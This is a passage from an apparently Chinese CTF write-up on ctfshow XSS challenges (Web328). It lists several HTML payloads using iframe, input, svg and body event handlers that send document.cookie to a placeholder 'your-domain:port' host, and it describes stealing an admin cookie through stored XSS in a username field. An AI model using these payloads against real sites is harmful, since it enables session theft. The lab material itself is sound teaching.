class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//iframe标签</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">&quot;window.open(&#x27;http://your-domain:port/&#x27;+document.cookie)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//input标签</span></span><br><span class="line">&lt;input onfocus=&quot;window.open(&#x27;http://your:domain/?cookie=&#x27;+document.cookie)&quot; autofocus&gt;</span><br><span class="line">    </span><br><span class="line">//svg标签</span><br><span class="line">&lt;svg onload=&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;&gt;</span><br><span class="line">    </span><br><span class="line">//body标签</span><br><span class="line">&lt;body onload=&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>xss平台上还有关于暗网的XSS，实体编码等等的手段，以后实际用到的时候再回来补充。</p>
<p>对于反射型xss，反手就是一个HTTP Only，这样就不好打了。</p>
<h2 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h2><h3 id="Web328"><a href="#Web328" class="headerlink" title="Web328"></a>Web328</h3><p>这题没什么难点，其实就是之前的反射型多了一步利用cookie绕过验证</p>
<p>进入用户管理页面，发现一个被隐藏的用户信息页面，因此我们直接把XSS打进去（我这里打的是用户名</p>
<p>顺利搞到管理员的cookie</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;iframe	onload=<span class="string">&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>



<h3 id="Web-329"><a href="#Web-329" class="headerlink" title="Web 329"></a>Web 329</h3>]]></content>
      <categories>
        <category>ctf</category>
        <category>web</category>
        <category>wp</category>
        <category>xss</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>wp</tag>
        <tag>ctfshow</tag>
        <tag>xss</tag>
      </tags>
  </entry>
</search>
